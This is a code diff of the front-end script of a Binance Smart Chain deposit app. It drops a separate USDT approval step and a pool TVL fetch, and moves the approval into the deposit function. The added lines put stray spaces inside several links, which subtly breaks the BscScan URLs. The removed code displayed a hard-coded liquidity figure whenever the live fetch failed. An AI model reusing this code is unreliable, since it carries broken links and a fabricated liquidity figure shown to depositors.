-                const formattedTVL = '$' + tvlFormatted.toLocaleString('en-US', {
-                    minimumFractionDigits: 2,
-                    maximumFractionDigits: 2
-                });
-
-                document.getElementById('poolLiquidity').textContent = formattedTVL;
-                
-            } catch (error) {
-                console.error('Error fetching pool TVL:', error);
-                // Fallback to static value if fetch fails
-                document.getElementById('poolLiquidity').textContent = '$38,874,070.07';
-            }
-        }
-
         function setupEventListeners() {
             // Navigation
             document.getElementById('navToggle').addEventListener('click', toggleMobileMenu);
@@ -3209,8 +3057,8 @@
                 }
             });
             
-            // Deposit amount calculator and approval check
-            document.getElementById('depositAmount').addEventListener('input', handleDepositInput);
+            // Deposit amount calculator
+            document.getElementById('depositAmount').addEventListener('input', updateDepositCalculator);
             
             // MetaMask events
             if (window.ethereum) {
@@ -3219,56 +3067,11 @@
             }
         }
 
-        async function handleDepositInput() {
-            updateDepositCalculator();
-            await checkAllowance();
-        }
-
-        async function checkAllowance() {
-            if (!userAccount || !usdtContract) return;
-            
-            const amount = parseFloat(document.getElementById('depositAmount').value) || 0;
-            depositAmountInWei = BigInt(web3.utils.toWei(amount.toString(), 'ether'));
-            
-            try {
-                const allowance = await usdtContract.methods.allowance(userAccount, CONTRACT_ADDRESS).call();
-                currentAllowance = BigInt(allowance);
-                
-                const approvalContainer = document.getElementById('approvalStatusContainer');
-                const approvalStatus = document.getElementById('approvalStatus');
-                const btnDeposit = document.getElementById('btnDeposit');
-                const btnApprove = document.getElementById('btnApprove');
-                
-                if (amount >= 10) {
-                    approvalContainer.style.display = 'block';
-                    
-                    if (currentAllowance >= depositAmountInWei) {
-                        // Approved
-                        approvalStatus.className = 'approval-status approval-status--approved';
-                        approvalStatus.innerHTML = '<i class="fas fa-check-circle"></i><span>USDT approved. Ready to deposit.</span>';
-                        btnDeposit.disabled = false;
-                        btnApprove.style.display = 'none';
-                    } else {
-                        // Not approved
-                        approvalStatus.className = 'approval-status approval-status--not-approved';
-                        approvalStatus.innerHTML = '<i class="fas fa-clock"></i><span>USDT not approved. Please approve first.</span>';
-                        btnDeposit.disabled = true;
-                        btnApprove.style.display = 'flex';
-                    }
-                } else {
-                    approvalContainer.style.display = 'none';
-                    btnDeposit.disabled = true;
-                }
-            } catch (error) {
-                console.error('Error checking allowance:', error);
-            }
-        }
-
         // ===== WALLET CONNECTION =====
         async function connectWallet() {
             if (!window.ethereum) {
                 showNotification('Please install MetaMask or use a Web3 browser!', 'error');
-                window.open('https://metamask.io/download/', '_blank');
+                window.open('https://metamask.io/download/    ', '_blank');
                 return;
             }
             
@@ -3277,7 +3080,6 @@
                 web3 = new Web3(window.ethereum);
                 contract = new web3.eth.Contract(CONTRACT_ABI, CONTRACT_ADDRESS);
                 usdtContract = new web3.eth.Contract(USDT_ABI, USDT_ADDRESS);
-                pancakePoolContract = new web3.eth.Contract(PANCAKE_V3_POOL_ABI, PANCAKE_V3_POOL);
                 
                 // Switch to BSC
                 const chainId = await window.ethereum.request({ method: 'eth_chainId' });
@@ -3296,7 +3098,7 @@
                                     chainName: 'Binance Smart Chain',
                                     nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
                                     rpcUrls: [BSC_RPC],
-                                    blockExplorerUrls: ['https://bscscan.com/']
+                                    blockExplorerUrls: ['https://bscscan.com/    ']
                                 }]
                             });
                         }
@@ -3521,51 +3323,6 @@
             }
         }
 
-        async function approveUSDT() {
-            if (!userAccount) {
-                showNotification('Please connect wallet first', 'error');
-                return;
-            }
-            
-            const amount = parseFloat(document.getElementById('depositAmount').value);
-            if (!amount || amount < 10) {
-                showNotification('Please enter a valid amount (minimum 10 USDT)', 'error');
-                return;
-            }
-            
-            const btn = document.getElementById('btnApprove');
-            setButtonLoading(btn, true);
-            
-            try {
-                const amountInWei = web3.utils.toWei(amount.toString(), 'ether');
-                
-                showTxModal('pending', 'Approving USDT...', 'Please confirm the approval transaction in MetaMask');
-                
-                const tx = await usdtContract.methods.approve(CONTRACT_ADDRESS, amountInWei).send({ 
-                    from: userAccount, 
-                    gas: 100000 
-                });
-                
-                showTxModal('success', 'Approval Successful!', 'USDT has been approved for deposit', tx.transactionHash);
-                
-                // Update allowance check
-                await checkAllowance();
-                
-            } catch (error) {
-                console.error('Approval error:', error);
-                closeTxModal();
-                
-                let errorMsg = error.message;
-                if (error.message.includes('user rejected') || error.code === 4001) {
-                    errorMsg = 'Transaction was rejected in MetaMask.';
-                }
-                
-                showNotification('Approval failed: ' + errorMsg, 'error');
-            } finally {
-                setButtonLoading(btn, false);
-            }
-        }
-
         async function makeDeposit() {
             if (!userAccount) {
                 showNotification('Please connect wallet first', 'error');
@@ -3592,12 +3349,6 @@
             
             if (!amount || amount < 10) {
                 showNotification('Minimum deposit is 10 USDT', 'error');
-                return;
-            }
-            
-            // Check if approved
-            if (currentAllowance < depositAmountInWei) {
-                showNotification('Please approve USDT first before depositing', 'error');
                 return;
             }
             
@@ -3649,19 +3400,21 @@
                     return;
                 }
                 
-                // Deposit (no need to approve again since we already did)
+                // Check and approve allowance
+                const allowance = await usdtContract.methods.allowance(userAccount, CONTRACT_ADDRESS).call();
+                if (BigInt(allowance) < BigInt(amountInWei)) {
+                    showTxModal('pending', 'Approving USDT...', 'Please approve USDT spending in MetaMask');
+                    await usdtContract.methods.approve(CONTRACT_ADDRESS, amountInWei).send({ from: userAccount, gas: 100000 });
+                }
+                
+                // Deposit
                 showTxModal('pending', 'Processing Deposit...', 'Please confirm the transaction');
                 const depositTx = await contract.methods.deposit(amountInWei).send({ from: userAccount, gas: 3000000 });
                 
                 showTxModal('success', 'Deposit Successful!', 'Your deposit has been processed successfully', depositTx.transactionHash);
                 
-                // Reset form
                 document.getElementById('depositAmount').value = '';
                 document.getElementById('depositRoiCalc').style.display = 'none';
-                document.getElementById('approvalStatusContainer').style.display = 'none';
-                document.getElementById('btnDeposit').disabled = true;
-                document.getElementById('btnApprove').style.display = 'flex';
-                
                 await loadUserData();
                 
             } catch (error) {
@@ -3990,7 +3743,7 @@
             if (hash) {
                 hashHtml = `
                     <div class="tx-status__hash">${hash}</div>
-                    <a href="https://bscscan.com/tx/${hash}" target="_blank" class="btn btn--primary" style="margin-top: 1rem;">
+                    <a href="https://bscscan.com/tx/    ${hash}" target="_blank" class="btn btn--primary" style="margin-top: 1rem;">
                         <i class="fas fa-external-link-alt"></i> View on BSCScan
                     </a>
                 `;
